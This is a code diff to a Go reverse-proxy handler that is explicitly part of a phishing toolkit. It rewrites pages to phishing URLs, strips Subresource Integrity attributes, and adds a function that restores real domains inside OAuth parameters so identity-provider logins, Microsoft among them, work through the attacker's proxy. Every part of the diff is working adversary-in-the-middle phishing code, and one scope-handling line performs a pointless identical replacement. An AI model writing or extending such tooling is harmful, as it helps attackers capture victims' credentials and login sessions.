@@ -1016,6 +1016,9 @@ func (m *ProxyHandler) rewriteResponseBodyWithContext(resp *http.Response, reqCt
 	body = m.patchUrls(reqCtx.ConfigMap, body, CONVERT_TO_PHISHING_URLS)
 	body = m.applyURLPathRewrites(body, reqCtx)
 
+	// restore original domains in OAuth-sensitive query parameters
+	body = m.restoreOAuthParams(body, reqCtx.ConfigMap)
+
 	// strip SRI integrity attributes from HTML since proxy modifies JS/CSS content
 	if strings.Contains(contentType, "text/html") {
 		body = m.stripSRIAttributes(body)
@@ -1167,6 +1170,9 @@ func (m *ProxyHandler) rewriteResponseBodyWithoutSessionContext(resp *http.Respo
 	body = m.patchUrls(configMap, body, CONVERT_TO_PHISHING_URLS)
 	body = m.applyURLPathRewritesWithoutSession(body, reqCtx)
 
+	// restore original domains in OAuth-sensitive query parameters
+	body = m.restoreOAuthParams(body, configMap)
+
 	// strip SRI integrity attributes from HTML since proxy modifies JS/CSS content
 	if strings.Contains(contentType, "text/html") {
 		body = m.stripSRIAttributes(body)
@@ -1213,6 +1219,63 @@ func (m *ProxyHandler) stripSRIAttributes(body []byte) []byte {
 	// match integrity='...' or integrity="..." with optional whitespace
 	sriPattern := regexp.MustCompile(`\s+integrity=['"][^'"]*['"]`)
 	return sriPattern.ReplaceAll(body, nil)
+}
+
+// restoreOAuthParams reverses proxy domain rewrites inside OAuth-sensitive query
+// parameters (redirect_uri, scope, resource, post_logout_redirect_uri, etc.).
+// These parameters are validated server-side by identity providers (e.g., Microsoft)
+// and must contain the original domain, not the proxy domain.
+func (m *ProxyHandler) restoreOAuthParams(body []byte, config map[string]service.ProxyServiceDomainConfig) []byte {
+	// OAuth-sensitive parameter names that must contain original domains
+	oauthParams := []string{
+		"redirect_uri",
+		"post_logout_redirect_uri",
+		"resource",
+		"scope",
+		"wctx",
+		"wreply",
+	}
+
+	// Build reverse mapping: proxy domain -> original domain
+	reverseMap := make(map[string]string)
+	for originalHost, hostConfig := range config {
+		if hostConfig.To != "" {
+			reverseMap[hostConfig.To] = originalHost
+		}
+	}
+
+	result := string(body)
+
+	for _, param := range oauthParams {
+		for proxyHost, originalHost := range reverseMap {
+			// Handle URL-encoded forms: redirect_uri=https%3A%2F%2Fproxy.domain
+			encodedProxy := url.QueryEscape("https://" + proxyHost)
+			encodedOriginal := url.QueryEscape("https://" + originalHost)
+			result = strings.ReplaceAll(result, param+"="+encodedProxy, param+"="+encodedOriginal)
+
+			// Handle lowercase URL-encoded: redirect_uri=https%3a%2f%2fproxy.domain
+			encodedProxyLower := strings.ReplaceAll(strings.ReplaceAll(encodedProxy, "%3A", "%3a"), "%2F", "%2f")
+			encodedOriginalLower := strings.ReplaceAll(strings.ReplaceAll(encodedOriginal, "%3A", "%3a"), "%2F", "%2f")
+			result = strings.ReplaceAll(result, param+"="+encodedProxyLower, param+"="+encodedOriginalLower)
+
+			// Handle non-encoded forms: redirect_uri=https://proxy.domain
+			result = strings.ReplaceAll(result, param+"=https://"+proxyHost, param+"=https://"+originalHost)
+			result = strings.ReplaceAll(result, param+"=http://"+proxyHost, param+"=http://"+originalHost)
+
+			// Handle double-encoded forms (inside JSON strings): redirect_uri=https%253A%252F%252Fproxy.domain
+			doubleEncodedProxy := url.QueryEscape(encodedProxy)
+			doubleEncodedOriginal := url.QueryEscape(encodedOriginal)
+			result = strings.ReplaceAll(result, param+"="+doubleEncodedProxy, param+"="+doubleEncodedOriginal)
+
+			// Also handle the proxy domain inside scope values (scope=openid+profile+https%3a%2f%2fproxy.domain%2f...)
+			if param == "scope" {
+				// scope values often use + or %20 as separators and contain URLs
+				result = strings.ReplaceAll(result, "scope="+strings.ReplaceAll(encodedProxyLower, "%3a%2f%2f", "%3a%2f%2f"), "scope="+strings.ReplaceAll(encodedOriginalLower, "%3a%2f%2f", "%3a%2f%2f"))
+			}
+		}
+	}
+
+	return []byte(result)
 }
 
 func (m *ProxyHandler) patchUrls(config map[string]service.ProxyServiceDomainConfig, body []byte, convertType int) []byte {
